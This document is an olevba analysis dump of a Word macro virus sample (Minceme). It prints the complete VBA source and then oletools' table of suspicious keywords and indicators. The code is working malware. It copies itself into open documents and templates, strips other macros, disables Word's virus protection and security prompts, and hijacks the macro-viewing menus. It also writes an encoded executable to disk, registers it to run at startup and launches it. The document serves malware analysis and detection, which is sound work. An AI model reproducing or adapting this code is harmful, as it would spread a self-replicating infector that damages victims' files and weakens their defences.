olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minceme.a-dfeb41fbdb45b363682e646cf28ee21c25d3128c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Mincer.cls 
in file: Virus.MSWord.Minceme.a-dfeb41fbdb45b363682e646cf28ee21c25d3128c - OLE stream: 'Macros/VBA/Mincer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Mincer!
Sub Cl()
On Error Resume Next
For Each doc In Documents
For Each A In doc.VBProject.vbcomponents
If A.Type <> 100 Then
Application.OrganizerDelete doc.FullName, A.Name, wdOrganizerObjectProjectItems
Else
If A.codemodule.lines(1, 1) <> "'Mincer!" Then A.codemodule.deletelines 1, A.codemodule.CountOfLines
End If
Next A
Next doc
For Each dot In Templates
For Each A In dot.VBProject.vbcomponents
If A.Type <> "100" And A.Name <> "Mincer" Then
Application.OrganizerDelete dot.FullName, A.Name, wdOrganizerObjectProjectItems
Else
If A.codemodule.lines(1, 1) <> "'Mincer!" Then A.codemodule.deletelines 1, A.codemodule.CountOfLines
End If
Next A
Next dot
End Sub
Sub IND()
On Error Resume Next
Dim body As String, RET As Boolean, NC As String
For Each Vs In MacroContainer.VBProject.vbcomponents
If Vs.Name = "Mincer" Then Set Vs = Vs.codemodule: Exit For
Next Vs
body = Vs.lines(1, Vs.CountOfLines)
For Each doc In Documents
If doc.VBProject.vbcomponents.Item(1).codemodule.lines(1, 1) <> "'Mincer!" And doc.VBProject.vbcomponents.Item(1).Name <> "MX" Then
vak = InStr(doc.FullName, ":")
If (vak = 0 Or doc.ReadOnly = True) And doc.Saved = False Then
Set ill = doc.VBProject.vbcomponents.Item(1).codemodule
ill.InsertLines 1, body
doc.VBProject.vbcomponents.Item(1).Name = "Mincer"
ElseIf vak <> 0 And doc.ReadOnly = False Then
Set ill = doc.VBProject.vbcomponents.Item(1).codemodule
ill.InsertLines 1, body
doc.VBProject.vbcomponents.Item(1).Name = "Mincer"
End If
End If
Next doc
End Sub
Sub INO()
On Error Resume Next
Dim body As String, RET As Boolean, NC As String
NC = Environ("WINDIR")
If Dir(NC & "\SYSTEM\Mincer.dll") = "" Then
Open NC & "\SYSTEM\Mincer.dll" For Output As 1
For Each Vs In MacroContainer.VBProject.vbcomponents
If Vs.Name = "Mincer" Then Set Vs = Vs.codemodule: Exit For
Next Vs
body = Vs.lines(1, Vs.CountOfLines)
Print #1, "Attribute VB_Name=""Mincer"""
Print #1, body
Close
End If
For Each dot In Templates
RET = False
For Each A In dot.VBProject.vbcomponents
If A.Name = "Mincer" And A.Type <> 100 Then RET = True
Next A
If RET = False Then
dot.VBProject.vbcomponents.Import (NC & "\SYSTEM\Mincer.dll")
End If
Next dot
End Sub
Sub AutoExit()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
With Options
.VirusProtection = False
.AllowFastSave = True
.SavePropertiesPrompt = False
.SaveNormalPrompt = False
End With
WordBasic.DisableAutoMacros 0
For Each l In CommandBars("tools").Controls
If l.ID = 522 Or l.ID = 751 Or l.ID = 797 Then l.OnAction = "AutoClose"
Next l
For Each doc In Documents
doc.ReadOnlyRecommended = False
doc.SaveFormsData = False
Next doc
End Sub
Sub MySpy()
On Error Resume Next
Dim MI As String, NC As String
MI = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\.doc\Word.Document.8\ShellNew", "FileName")
NC = Environ("WINDIR")
If Dir(NC & "\Media\MySpy.dot") = "" Then
WordBasic.DisableAutoMacros 1
Documents.Add NewTemplate:=True
ActiveDocument.VBProject.vbcomponents.Item(1).Name = "MX"
INO
ActiveDocument.SaveAs NC & "\Media\MySpy.dot", , , , False
Options.DefaultFilePath(Path:=wdUserTemplatesPath) = NC
Options.DefaultFilePath(Path:=wdStartupPath) = NC & "\Media"
ActiveDocument.Close
End If
WordBasic.DisableAutoMacros 0
End Sub
Sub AutoExec()
On Error Resume Next
Test
Cl
AutoExit
INO
p$ = Environ("WINDIR")
AddIns(p$ & "\Media\MySpy.dot").Installed = False
End Sub
Sub Test()
Dim A As String, B As String, C As Long, D As String, E As String
If Format(Date, "d") <> 2 Then Exit Sub
A = "9460301/3/4/65535/184/0/64/0/0/0/0/0/0/0/0/128/247078670/-855002112/1275181089/1750344141/1881174889/1919381362/1663069537/1869508193/1700929652/1853190688/544106784/542330692/1701080941/168627502/36/0/17744/65868/891316465/0/0/17760480/327947/4096/0/0/4112/4096/8192/4194304/4096/512/4/0/4/0/8192/512/0/2/1048576/4096/1048576/4096/0/16/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/2019914798/116/4096/4096/4096/512/0/0/0/1610612768/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/195/0/0/1021/608472405/1692087288/15205255/1526726656/1363299213/17780816/1543382092/-98778237/-1956238453/1905130603/-1989781998/-289276813/1938384400/1456233986/1217130635/-2086341636/814418152/41219595/-866193173/-337955845/1692087047/545981323/1476628324/268462173/1958936640/-1054798030/75698403/-1989798620/-306054037/1804166672/588238594/1359964867/1364328298/1778477649/1394658562/-2097151744/-1919475516/-1915773626/-203385/550326527/4194407/1488986895/-1958916469/-61830895/" & _
"-1982447475/-1226049023/59475/-2091188224/-850189117/1073768480/1962891264/1409222692/1397774844/1509708799/1488986895/50011/-396361728/0/365330782/-167772157/-2062614266/520/673471629/254032771/128389/-2096693760/-1974073914/-12843965/1074006132/109656756/6964806/1535868778/205753104/1342488707/1092668758/-2097135616/2088833220/1160707078/257836376/112261/2072208896/-2062614248/427/1124120678/3285197/-2112946112/411/1354664785/-1946157059/29488703/-1201272716/-919387391/-1070344193/-919349836/-1958555085/-671136806/-157525613/108265921/1124186214/262002687/90754/-2086906368/-1070366778/-393488716/1784218730/-671131076/-1958078837/-2116550715/1162870846/612699904/1392508929/23724138/588207954/-980725556/" & _
"-1031581007/-1915224313/-1924128190/-1223733242/1418530374/682627600/-503968118/1345484429/1363236434/1359208897/-905721853/-149139925/-1856945711/66078347/-2037777338/-1109/607945062/2071724216/-671103605/1493461653/1012108114/-15547773/1849590231/1953524058/1599822439/-721201319/1441661778/-63093619/55777417/-1098034473/-1203/-833189545/-1109895539/1021/-1031589397/274369320/1980258859/-394046676/-1961326328/1510151258/-1957211384/1510148186/-60947700/-1962649463/140116248/1076120193/725614592/51279595/264758011/871091233/-348339069/19398986/856171628/-61306405/-56785267/78774271/-855586970/-1902867680/-219/251809929/607229110/738197503/266724034/1485555745/1496877840/-242545181/14025144/-10921472/1542515671/865925464/" & _
"-2640704/1935580631/1725926193/-1958542408/2123103310/-19660802/258079566/553631777/1946147979/609484600/474188121/606632835/1099630197/21399848/129024865/1910796518/-747306444/217628006/-1077709171/-2147469236/218020454/1725366266/1241536703/138856294/-687927516/-1191944563/939349/237677241/-959185152/-497983488/-1998310658/-18706176/257250744/-1430955776/13030399/-1258364384/1711311072/201868999/869728016/1400944603/1747774595/-1073737728/1364396215/23613777/1094713349/-192196271/11332737/550305792/1048580/108954470/-33197033/-286569146/-972005887/-343913146/-2012706587/-2147432959/25692296/-712534077/-712534033/-1757147924/-1745889913/-1007757945/661010944/65619/4194408/4194369/4194354/1668180301/1981837925/540028465/1294355783/88/"
Open "Mincer.EXE" For Binary As 1
Do Until A = ""
C = InStr(A, "/")
B = Left(A, C - 1)
A = Right$(A, Len(A) - C)
C = Val(B)
Put 1, , C
Loop
Close
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices", "Mincer") = CurDir & "\Mincer.exe"
AW$ = InputBox("Who I love?", "Question")
If AW$ = "MX" Then
Kill "Mincer.EXE"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices", "Mincer") = ""
MsgBox "Hello,my friend!", 4096, "SMART!"
Else
Shell "Mincer.EXE"
MsgBox "Bios OK?", 48, "Mincing DATA..."
End If
End Sub
Sub FileOpen()
Dialogs(wdDialogFileOpen).Show
AutoOpen
End Sub
Sub AutoOpen()
AutoExit
Cl
IND
INO
End Sub
Sub AutoClose()
MySpy
AutoOpen
For Each doc In Documents
v& = InStr(doc.FullName, ":")
If doc.ReadOnly = False And v <> 0 Then
                                                                                                                          doc.Save
End If
Next doc
End Sub
Sub ViewVBCode()
AutoClose
End Sub
Sub ViewSecurity()
AutoClose
End Sub
Sub ToolsMacro()
AutoClose
End Sub













+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Mincer.dll          |Executable file name                         |
|IOC       |Mincer.EXE          |Executable file name                         |
|IOC       |Mincer.exe          |Executable file name                         |
|Hex String|$pxg                |24707867                                     |
|Hex String|T#0i                |54233069                                     |
|Hex String|9car                |39636172                                     |
|Hex String|6S0x                |36533078                                     |
|Hex String| baBf               |2062614266                                   |
|Hex String|g4qb                |67347162                                     |
|Hex String|%@2w                |25403277                                     |
|Hex String|%x67                |25783637                                     |
|Hex String| baBH               |2062614248                                   |
|Hex String|#rA8                |23724138                                     |
|Hex String|h&'`                |68262760                                     |
|Hex String| 7ws8               |2037777338                                   |
|Hex String|'Ci2                |27436932                                     |
|Hex String|9@Fg                |39404667                                     |
|Hex String|VxRg                |56785267                                     |
|Hex String|xwBq                |78774271                                     |
|Hex String|U61w                |55363177                                     |
|Hex String|hy'Q                |68792751                                     |
|Hex String|#vw$                |23767724                                     |
|Hex String|%rPt                |25725074                                     |
|Hex String|#a7w                |23613777                                     |
|Hex String|!GC)Y               |2147432959                                   |
+----------+--------------------+---------------------------------------------+

